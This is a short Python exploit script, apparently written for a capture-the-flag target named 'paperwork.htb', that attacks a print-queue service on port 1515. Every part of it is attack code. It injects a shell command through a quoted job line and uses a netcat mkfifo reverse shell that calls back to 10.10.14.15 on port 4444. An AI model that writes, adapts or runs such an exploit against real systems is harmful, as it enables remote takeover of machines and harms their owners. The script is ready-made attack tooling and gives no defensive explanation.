#!/usr/bin/env python3
import socket

HOST = "paperwork.htb"
PORT = 1515
QUEUE = "archive_intake"

# Reverse shell (netcat)
CMD = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.15 4444 > /tmp/f"

def recv_ack(sock):
    data = sock.recv(1)
    if not data:
        print("[-] Connection closed")
        return False
    print(f"[+] ACK: {data.hex()}")
    if data != b"\x00":
        print("[-] Server rejected request")
        return False
    return True

payload_line = f"J'; {CMD}; echo '".encode()
content = payload_line + b"\n"
L = len(content)
size = L - 1  # server reads size+1 bytes

with socket.create_connection((HOST, PORT)) as s:
    print("[+] Connected")
    s.sendall(b"\x02" + QUEUE.encode() + b"\n")
    if not recv_ack(s):
        exit(1)
    print("[+] Queue accepted")

    chunk = b"\x02 " + str(size).encode() + b"\n"
    s.sendall(chunk)
    s.sendall(content)
    print("[*] Payload sent. Check your listener!")
